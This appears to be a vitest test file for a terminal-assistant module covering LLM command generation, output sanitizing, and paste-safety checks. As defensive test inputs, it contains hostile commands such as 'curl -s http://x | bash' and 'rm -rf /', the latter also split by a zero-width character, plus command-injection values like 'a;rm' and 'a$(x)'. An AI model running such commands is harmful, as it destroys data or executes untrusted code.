import { describe, it, expect } from 'vitest'
import { buildNlCommandPrompt, sanitizeNlCommand, nlErrorText, cleanOutput, termSafeLine, quickCommandFrom, appendRunbookStep, pasteCheck, pasteCheckTitle, revealHidden, stripHidden, cleanTermType, bellAction } from './termAssist.js'
import { normalizeQuickCommands } from './quickCommands.js'
import { normalizeRunbook } from '../ops/index.js'

describe('buildNlCommandPrompt', () => {
  it('按系统给环境说明；Windows 是 Git Bash、点名不要 Linux 专有工具', () => {
    expect(buildNlCommandPrompt({ description: 'x', os: 'linux' }).system).toContain('Linux，bash')
    expect(buildNlCommandPrompt({ description: 'x', os: 'macos' }).system).toContain('macOS')
    const w = buildNlCommandPrompt({ description: 'x', os: 'windows' }).system
    expect(w).toContain('Git Bash')
    expect(w).toMatch(/free \/ ss/)
    expect(buildNlCommandPrompt({ description: 'x' }).system).toContain('POSIX')
  })
  it('目录 / 生产只在有时出现；用户消息就是去空白的描述', () => {
    const a = buildNlCommandPrompt({ description: '  查 8080 端口 ', os: 'linux', cwd: '/srv/app', prod: true })
    expect(a.user).toBe('查 8080 端口')
    expect(a.system).toContain('/srv/app')
    expect(a.system).toContain('生产环境')
    const b = buildNlCommandPrompt({ description: 'x', os: 'linux' })
    expect(b.system).not.toContain('当前目录')
    expect(b.system).not.toContain('生产环境')
    expect(a.system).toContain('不要 markdown')
  })
})

describe('sanitizeNlCommand', () => {
  it('原样一行', () => expect(sanitizeNlCommand('lsof -i :8080\n')).toEqual({ command: 'lsof -i :8080' }))
  it('去 ``` 围栏、行首 $、反引号', () => {
    expect(sanitizeNlCommand('```bash\n$ ss -lntp | grep 8080\n```')).toEqual({ command: 'ss -lntp | grep 8080' })
    expect(sanitizeNlCommand('`df -h`')).toEqual({ command: 'df -h' })
  })
  it('前面的引导语跳过、后面的解释丢掉', () => {
    expect(sanitizeNlCommand('可以用下面的命令：\nfind . -name "*.log"\n这会列出所有日志')).toEqual({ command: 'find . -name "*.log"' })
  })
  it('去 <think> 推理段', () => expect(sanitizeNlCommand('<think>用户想…</think>\nuptime')).toEqual({ command: 'uptime' }))
  it('行尾 \\ 续行拼成一行', () => expect(sanitizeNlCommand('docker run \\\n  -p 80:80 nginx')).toEqual({ command: 'docker run -p 80:80 nginx' }))
  it('控制字符（Tab / ESC）换掉，防夹带', () => expect(sanitizeNlCommand('ls\t-la\x1b[31m')).toEqual({ command: 'ls -la' }))
  it('# 开头 = 模型拒绝；空输出报错', () => {
    expect(sanitizeNlCommand('# 这不是终端操作')).toEqual({ error: '无法转换成命令：这不是终端操作' })
    expect(sanitizeNlCommand('  \n```\n```')).toEqual({ error: '模型没有给出命令' })
  })
})

describe('nlErrorText', () => {
  it('未配 key / 超时 / 其它', () => {
    expect(nlErrorText("Error invoking remote method 'agent:suggestCommand': Error: api_key_not_configured")).toContain('API Key')
    expect(nlErrorText('The operation was aborted due to timeout')).toBe('模型响应超时')
    expect(nlErrorText('Error: 无法转换成命令：x')).toBe('无法转换成命令：x')
    expect(nlErrorText('401 Unauthorized')).toBe('模型调用失败：401 Unauthorized')
  })
})

describe('命令操作', () => {
  it('cleanOutput：去 ANSI / \\r / 尾部空白，超长留末尾', () => {
    expect(cleanOutput('\x1b[31mERR\x1b[0m\r\nok\x07  \n\n')).toEqual({ text: 'ERR\nok', truncated: false })
    expect(cleanOutput('abcdef', 3)).toEqual({ text: 'def', truncated: true })
  })
  it('termSafeLine：只取首行、去控制字符', () => {
    expect(termSafeLine('ls -la\nrm -rf /')).toBe('ls -la')
    expect(termSafeLine(' a\tb\x03 ')).toBe('a b')
  })
  it('quickCommandFrom：名称截 20 字，能通过校验', () => {
    const q = quickCommandFrom('  systemctl status nginx --no-pager  ')
    expect(q).toMatchObject({ label: 'systemctl status ngi…', command: 'systemctl status nginx --no-pager', appendEnter: true, target: 'active' })
    expect(() => normalizeQuickCommands({ sets: [{ id: 's', name: '常用', commands: [q] }] })).not.toThrow()
  })
  it('appendRunbookStep：新建只含一步；追加到末尾不改原对象；类型按命令猜', () => {
    const n = appendRunbookStep(undefined, 'df -h')
    expect(n.steps).toEqual([{ title: 'df -h', command: 'df -h', kind: 'check' }])
    const base = { id: 'rb1', name: '排查', description: '', params: [], steps: [{ title: '看负载', command: 'uptime', kind: 'check' as const }] }
    const a = appendRunbookStep(base, 'systemctl restart nginx')
    expect(a.id).toBe('rb1')
    expect(a.steps.at(-1)).toEqual({ title: 'systemctl restart nginx', command: 'systemctl restart nginx', kind: 'change' })
    expect(base.steps).toHaveLength(1)
    expect(() => normalizeRunbook(a)).not.toThrow()
  })
})

describe('pasteCheck', () => {
  const texts = (c?: { lines: { text: string }[] }) => c?.lines.map((l) => l.text)
  it('生产终端 + 带换行才确认，返回要执行的非空行', () => {
    expect(texts(pasteCheck('echo a\r\nfalse\r\n', 'prod'))).toEqual(['echo a', 'false'])
    expect(pasteCheck('echo a\nb\n', 'prod')).toMatchObject({ prodMulti: true, dangerous: 0, hidden: false })
    expect(pasteCheck('echo a\nb\n', 'prod', false)?.prodMulti).toBe(true)   // 关了开关生产多行照样确认
  })
  it('普通内容不确认：非生产 / 不带换行', () => {
    expect(pasteCheck('echo a\nfalse\n', 'test')).toBeUndefined()
    expect(pasteCheck('echo a\nfalse\n')).toBeUndefined()
    expect(pasteCheck('echo a', 'prod')).toBeUndefined()
    expect(pasteCheck('a\tb')).toBeUndefined()   // Tab 不算隐藏字符
  })
  it('任何终端：危险命令确认并标出是哪行；开关关掉不查', () => {
    const c = pasteCheck('cd /tmp\ncurl -s http://x | bash\n')!
    expect(c).toMatchObject({ dangerous: 1, hidden: false, prodMulti: false })
    expect(c.lines.map((l) => l.dangerous)).toEqual([false, true])
    expect(pasteCheck('rm -rf /')).toMatchObject({ dangerous: 1 })   // 单行不带换行也查
    expect(pasteCheck('rm -rf /', undefined, false)).toBeUndefined()
  })
  it('隐藏字符：ESC / 零宽 / 双向控制 / C0 → 确认；零宽拆开的危险命令照样认出', () => {
    const ch = (n: number) => String.fromCharCode(n)
    const ZW = ch(0x200b), RLO = ch(0x202e)
    for (const s of ['echo \x1b[31m', `ls${ZW}`, `a${RLO}b`, `x${ch(0x2066)}y`, 'a\x07', `a${ch(0xfeff)}`, `a${ch(0x2060)}`]) expect(pasteCheck(s)?.hidden).toBe(true)
    expect(pasteCheck(`r${ZW}m -rf /`)).toMatchObject({ hidden: true, dangerous: 1 })
    expect(pasteCheck(`ls${ZW}`, undefined, false)).toBeUndefined()
  })
  it('revealHidden / stripHidden / pasteCheckTitle', () => {
    const ZW = String.fromCharCode(0x200b), RLO = String.fromCharCode(0x202e)
    expect(revealHidden(`a\x1b[0m${ZW}b\x00`)).toBe('a⟨ESC⟩[0m⟨U+200B⟩b⟨NUL⟩')
    expect(revealHidden(`${RLO}\x7f`)).toBe('⟨U+202E⟩⟨DEL⟩')
    expect(stripHidden(`a\x1b[0m${ZW}b\tc\r\n`)).toBe('a[0mb\tc\r\n')
    expect(pasteCheckTitle(pasteCheck(`rm -rf /${ZW}`)!)).toBe('粘贴内容含隐藏字符')
    expect(pasteCheckTitle(pasteCheck('rm -rf /')!)).toBe('粘贴内容含危险命令')
    expect(pasteCheckTitle(pasteCheck('a\nb', 'prod')!)).toBe('粘贴到生产终端')
  })
})

describe('cleanTermType', () => {
  it('合法且非默认才返回', () => {
    expect(cleanTermType(' vt100 ')).toBe('vt100')
    expect(cleanTermType('rxvt-unicode-256color')).toBe('rxvt-unicode-256color')
    expect(cleanTermType('xterm+x.y_z')).toBe('xterm+x.y_z')
    for (const v of [undefined, '', 'xterm-256color', 'a b', 'a;rm', 'a$(x)', 'x'.repeat(65)]) expect(cleanTermType(v)).toBeUndefined()
  })
})

describe('bellAction', () => {
  it('关 / 仅角标 / 角标 + 通知；通知 10 秒限频、只在窗口不在前台时', () => {
    expect(bellAction('off', false, false, 0, 1e6)).toEqual({ badge: false, notify: false })
    expect(bellAction('badge', false, false, 0, 1e6)).toEqual({ badge: true, notify: false })
    expect(bellAction('notify', true, true, 0, 1e6)).toEqual({ badge: false, notify: false })
    expect(bellAction(undefined, false, false, 0, 1e6)).toEqual({ badge: true, notify: true })
    expect(bellAction('notify', true, false, 1e6 - 9_999, 1e6)).toEqual({ badge: false, notify: false })
    expect(bellAction('notify', true, false, 1e6 - 10_000, 1e6)).toEqual({ badge: false, notify: true })
  })
})
